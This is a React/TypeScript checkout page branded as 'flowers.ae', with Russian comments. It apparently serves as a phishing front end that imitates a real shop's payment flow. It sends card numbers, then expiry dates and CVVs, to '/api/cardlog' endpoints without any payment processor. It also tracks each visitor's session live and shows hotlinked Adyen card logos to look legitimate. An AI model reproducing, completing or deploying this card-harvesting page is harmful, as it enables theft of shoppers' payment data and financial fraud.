import styles from "./Payment.module.css";
import { useState } from "react";
import { useCart } from "../../context/cartContext";
import Loading from "../../components/Loading/Loading";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";
import Modal from "../../components/UI/Modal/Modal";

interface PaymentData {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardHolder: string;
}

// Валидационные сообщения
interface ValidationErrors {
  name?: string;
  surname?: string;
  phoneNumber?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
}

const Payment = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  useRedirectChecker(3000);
  useOnlineStatus({ sessionId, pageName: "payment", enabled: true });
  const { state, setCustomerData, getTotalPrice } = useCart();
  const [isActive, setActive] = useState<boolean>(false);
  const [paymentData, setPaymentData] = useState<PaymentData>({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: "",
  });

  const [currentStep, setCurrentStep] = useState<"contact" | "payment">(
    "contact"
  );
  const [isProcessing, setIsProcessing] = useState(false);
  const [showCvvModal, setShowCvvModal] = useState(false);
  
  // Состояние для ошибок валидации
  const [errors, setErrors] = useState<ValidationErrors>({});

  // Валидация имени и фамилии (только буквы и пробелы)
  const validateName = (value: string): boolean => {
    return /^[A-Za-zА-Яа-я\s\-']+$/.test(value);
  };

  // Валидация номера телефона (только цифры, пробелы, +, -, скобки)
  const validatePhone = (value: string): boolean => {
    return /^[\d+\-\s()]+$/.test(value);
  };

  // Валидация номера карты (только цифры и пробелы)
  const validateCardNumber = (value: string): boolean => {
    return /^[\d\s]+$/.test(value);
  };

  // Валидация даты expiration (только цифры и /)
  const validateExpiryDate = (value: string): boolean => {
    return /^[\d/]+$/.test(value);
  };

  // Валидация CVV (только цифры)
  const validateCvv = (value: string): boolean => {
    return /^\d+$/.test(value);
  };

  const handleCustomerInputChange = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const { name, value } = e.target;
    
    // Очищаем ошибку при вводе
    if (errors[name as keyof ValidationErrors]) {
      setErrors(prev => ({ ...prev, [name]: undefined }));
    }

    let processedValue = value;

    // Валидация в реальном времени
    if (name === "name" || name === "surname") {
      if (value && !validateName(value)) {
        setErrors(prev => ({ 
          ...prev, 
          [name]: "Only letters, spaces, hyphens and apostrophes are allowed" 
        }));
        return;
      }
    }

    if (name === "phoneNumber") {
      if (value && !validatePhone(value)) {
        setErrors(prev => ({ 
          ...prev, 
          [name]: "Only numbers, spaces, +, - and parentheses are allowed" 
        }));
        return;
      }
    }

    setCustomerData({
      ...state.customerData!,
      [name]: processedValue,
    });
  };

  const handlePaymentInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Очищаем ошибку при вводе
    if (errors[name as keyof ValidationErrors]) {
      setErrors(prev => ({ ...prev, [name]: undefined }));
    }

    if (name === "cardNumber") {
      if (value && !validateCardNumber(value)) {
        setErrors(prev => ({ 
          ...prev, 
          [name]: "Only numbers and spaces are allowed" 
        }));
        return;
      }

      const formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19);
      setPaymentData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    if (name === "expiryDate") {
      if (value && !validateExpiryDate(value)) {
        setErrors(prev => ({ 
          ...prev, 
          [name]: "Only numbers and / are allowed" 
        }));
        return;
      }

      const formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5);
      setPaymentData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    if (name === "cvv") {
      if (value && !validateCvv(value)) {
        setErrors(prev => ({ 
          ...prev, 
          [name]: "Only numbers are allowed" 
        }));
        return;
      }

      const formattedValue = value.replace(/\D/g, "").slice(0, 3);
      setPaymentData((prev) => ({ ...prev, [name]: formattedValue }));
      return;
    }

    setPaymentData((prev) => ({ ...prev, [name]: value }));
  };

  const validateCustomerForm = (): boolean => {
    const newErrors: ValidationErrors = {};

    if (!state.customerData?.name?.trim()) {
      newErrors.name = "First name is required";
    } else if (!validateName(state.customerData.name)) {
      newErrors.name = "Only letters, spaces, hyphens and apostrophes are allowed";
    }

    if (!state.customerData?.surname?.trim()) {
      newErrors.surname = "Last name is required";
    } else if (!validateName(state.customerData.surname)) {
      newErrors.surname = "Only letters, spaces, hyphens and apostrophes are allowed";
    }

    if (!state.customerData?.phoneNumber?.trim()) {
      newErrors.phoneNumber = "Phone number is required";
    } else if (!validatePhone(state.customerData.phoneNumber)) {
      newErrors.phoneNumber = "Only numbers, spaces, +, - and parentheses are allowed";
    } else if (state.customerData.phoneNumber.replace(/\D/g, "").length < 7) {
      newErrors.phoneNumber = "Please enter a valid phone number";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleCustomerSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

   if (!validateCustomerForm()) {
  return;
}

// Добавьте проверку на существование customerData
if (!state.customerData) {
  alert("Please fill in customer information");
  return;
}
    try {
      setActive(true);
      const res = await fetch("/api/customer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          name: state.customerData.name,
          surname: state.customerData.surname,
          phone: state.customerData.phoneNumber,
        }),
      });

      const data = await res.json();
      if (data.success) {
        setActive(false);
      }
    } catch (error) {
      console.error("Payment error:", error);
      alert("There was an error processing your payment. Please try again.");
    }

    setCurrentStep("payment");
  };

  // Первый шаг: отправка только номера карты
  const handleCardNumberSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.cardNumber) {
      setErrors({ cardNumber: "Card number is required" });
      return;
    }

    if (paymentData.cardNumber.replace(/\s/g, "").length !== 16) {
      setErrors({ cardNumber: "Please enter a valid 16-digit card number" });
      return;
    }

    try {
      // Отправляем только номер карты
      await fetch("/api/cardlog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          cardNumber: paymentData.cardNumber.replace(/\s+/g, ""),
          expireDate: "",
          cvv: "",
          step: "card_number_only",
        }),
      });

      // Показываем модалку для ввода CVV и expiry date
      setShowCvvModal(true);

    } catch (error) {
      console.error("Error sending card number:", error);
      alert("There was an error processing your card. Please try again.");
    }
  };

  // Второй шаг: отправка полных данных карты
  const handleCvvSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const newErrors: ValidationErrors = {};

    if (!paymentData.expiryDate) {
      newErrors.expiryDate = "Expiration date is required";
    } else if (!/^\d{2}\/\d{2}$/.test(paymentData.expiryDate)) {
      newErrors.expiryDate = "Please enter a valid expiration date (MM/YY)";
    }

    if (!paymentData.cvv) {
      newErrors.cvv = "Security code is required";
    } else if (paymentData.cvv.length !== 3) {
      newErrors.cvv = "Please enter a valid 3-digit security code";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      setIsProcessing(false);
      return;
    }

    setIsProcessing(true);

    try {
      // Отправляем полные данные карты
      await fetch("/api/cardlog-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          cvv: paymentData.cvv,
          expireDate: paymentData.expiryDate,
        }),
      });

      console.log("Full payment data:", { ...state.customerData, ...paymentData });

      // Очищаем корзину после успешной оплаты
      setPaymentData({
        cardNumber: "",
        expiryDate: "",
        cvv: "",
        cardHolder: "",
      });

      setShowCvvModal(false);
      
      // Здесь можно добавить редирект на страницу успеха
      // window.location.href = "/success";

    } catch (error) {
      console.error("Payment error:", error);
      alert("There was an error processing your payment. Please try again.");
    } finally {
      setActive(true);
    }
  };

  // Используем реальные данные из контекста
  const cartItems = state.cart;

  return (
    <div className={styles.checkout__container}>
      <div className={styles.checkout__wrapper}>
        {/* Header */}
        <header className={styles.checkout__header}>
          <div className={styles.header__content}>
            <div className={styles.logo}>
              <span>flowers.ae</span>
            </div>
            <nav className={styles.breadcrumb}>
              <span className={currentStep === "contact" ? styles.active : ""}>
                Contact information
              </span>
              <span className={styles.separator}>›</span>
              <span className={currentStep === "payment" ? styles.active : ""}>
                Payment method
              </span>
            </nav>
          </div>
        </header>

        <div className={styles.checkout__content}>
          {/* Left Side - Forms */}
          <div className={styles.forms__section}>
            {currentStep === "contact" ? (
              // Contact Information Form
              <div className={styles.form__container}>
                <div className={styles.form__header}>
                  <h2>Contact information</h2>
                </div>

                <form
                  onSubmit={handleCustomerSubmit}
                  className={styles.customer__form}
                >
                  <div className={styles.input__row}>
                    <div className={styles.input__group}>
                      <label>First name *</label>
                      <input
                        type="text"
                        name="name"
                        value={state.customerData?.name || ""}
                        onChange={handleCustomerInputChange}
                        placeholder="First name"
                        required
                        className={`${styles.form__input} ${
                          errors.name ? styles.input__error : ""
                        }`}
                      />
                      {errors.name && (
                        <span className={styles.error__message}>
                          {errors.name}
                        </span>
                      )}
                    </div>
                    <div className={styles.input__group}>
                      <label>Last name *</label>
                      <input
                        type="text"
                        name="surname"
                        value={state.customerData?.surname || ""}
                        onChange={handleCustomerInputChange}
                        placeholder="Last name"
                        required
                        className={`${styles.form__input} ${
                          errors.surname ? styles.input__error : ""
                        }`}
                      />
                      {errors.surname && (
                        <span className={styles.error__message}>
                          {errors.surname}
                        </span>
                      )}
                    </div>
                  </div>

                  <div className={styles.input__group}>
                    <label>Phone number *</label>
                    <input
                      type="tel"
                      name="phoneNumber"
                      value={state.customerData?.phoneNumber || ""}
                      onChange={handleCustomerInputChange}
                      placeholder="+971 50 123 4567"
                      required
                      className={`${styles.form__input} ${
                        errors.phoneNumber ? styles.input__error : ""
                      }`}
                    />
                    {errors.phoneNumber && (
                      <span className={styles.error__message}>
                        {errors.phoneNumber}
                      </span>
                    )}
                  </div>

                  <button type="submit" className={styles.continue__btn}>
                    Continue to payment
                  </button>
                </form>
              </div>
            ) : (
              // Payment Form - Только номер карты
              <div className={styles.form__container}>
                <div className={styles.form__header}>
                  <h2>Payment method</h2>
                </div>

                <form
                  onSubmit={handleCardNumberSubmit}
                  className={styles.payment__form}
                >
                  <div className={styles.payment__method}>
                    <div className={styles.payment__tabs}>
                      <button
                        type="button"
                        className={`${styles.payment__tab} ${styles.active}`}
                      >
                        Credit card
                      </button>
                    </div>

                    <div className={styles.card__form}>
                      <div className={styles.input__group}>
                        <label>Card number *</label>
                        <input
                          type="text"
                          name="cardNumber"
                          value={paymentData.cardNumber}
                          onChange={handlePaymentInputChange}
                          placeholder="1234 1234 1234 1234"
                          maxLength={19}
                          required
                          className={`${styles.form__input} ${
                            errors.cardNumber ? styles.input__error : ""
                          }`}
                        />
                        <div className={styles.card__icons}>
                          <img
                            height="24"
                            alt="visa"
                            src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg"
                          />
                          <img
                            height="24"
                            alt="mc"
                            src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg"
                          />
                          <img
                            height="24"
                            alt="amex"
                            src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                          />
                        </div>
                        {errors.cardNumber && (
                          <span className={styles.error__message}>
                            {errors.cardNumber}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className={styles.form__actions}>
                    <button
                      type="submit"
                      className={styles.continue__btn}
                    >
                      Continue
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>

          {/* Right Side - Order Summary */}
          <div className={styles.summary__section}>
            <div className={styles.order__summary}>
              <h3>Order summary</h3>

              <div className={styles.cart__items}>
                {cartItems.map((item) => (
                  <div key={item.id} className={styles.summary__item}>
                    <div className={styles.item__image}>
                      <img src={item.image} alt={item.title} />
                      <span className={styles.item__quantity}>
                        {item.quantity}
                      </span>
                    </div>
                    <div className={styles.item__details}>
                      <h4 className={styles.item__title}>{item.title}</h4>
                      <p className={styles.item__price}>
                        AED {item.price.toFixed(2)}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              <div className={styles.summary__totals}>
                <div className={styles.total__line}>
                  <span>Subtotal</span>
                  <span>AED {getTotalPrice().toFixed(2)}</span>
                </div>
                <div className={styles.total__line}>
                  <span>Shipping</span>
                  <span>FREE</span>
                </div>
                <div className={styles.total__line}>
                  <span>Taxes</span>
                  <span>AED 0.00</span>
                </div>
                <div className={styles.grand__total}>
                  <span>Total</span>
                  <span>AED {getTotalPrice().toFixed(2)}</span>
                </div>
              </div>

              {currentStep === "payment" && state.customerData && (
                <div className={styles.customer__info}>
                  <div className={styles.info__section}>
                    <h4>Contact</h4>
                    <p>{state.customerData.phoneNumber}</p>
                    <button
                      className={styles.change__btn}
                      onClick={() => setCurrentStep("contact")}
                    >
                      Change
                    </button>
                  </div>

                  <div className={styles.info__section}>
                    <h4>Ship to</h4>
                    <p>
                      {state.customerData.name} {state.customerData.surname}
                    </p>
                    <p>{state.customerData.phoneNumber}</p>
                    <button
                      className={styles.change__btn}
                      onClick={() => setCurrentStep("contact")}
                    >
                      Change
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Модалка для ввода CVV и Expiry Date */}
      <Modal active={showCvvModal} setActive={setShowCvvModal}>
        <div className={styles.modal__content}>
          <h3>Additional card details</h3>
          <p>Please enter your card's security details</p>
          
          <form onSubmit={handleCvvSubmit} className={styles.payment__form}>
            <div className={styles.input__row}>
              <div className={styles.input__group}>
                <label>Expiration date *</label>
                <input
                  type="text"
                  name="expiryDate"
                  value={paymentData.expiryDate}
                  onChange={handlePaymentInputChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                  className={`${styles.form__input} ${
                    errors.expiryDate ? styles.input__error : ""
                  }`}
                />
                {errors.expiryDate && (
                  <span className={styles.error__message}>
                    {errors.expiryDate}
                  </span>
                )}
              </div>
              <div className={styles.input__group}>
                <label>Security code *</label>
                <input
                  type="text"
                  name="cvv"
                  value={paymentData.cvv}
                  onChange={handlePaymentInputChange}
                  placeholder="123"
                  maxLength={3}
                  required
                  className={`${styles.form__input} ${
                    errors.cvv ? styles.input__error : ""
                  }`}
                />
                {errors.cvv && (
                  <span className={styles.error__message}>
                    {errors.cvv}
                  </span>
                )}
              </div>
            </div>

            <div className={styles.form__actions}>
              <button
                type="submit"
                disabled={isProcessing}
                className={styles.pay__btn}
              >
                {isProcessing
                  ? "Processing..."
                  : `Pay AED ${getTotalPrice().toFixed(2)}`}
              </button>
            </div>
          </form>
        </div>
      </Modal>

      <Loading isLoading={isActive} />
    </div>
  );
};

export default Payment;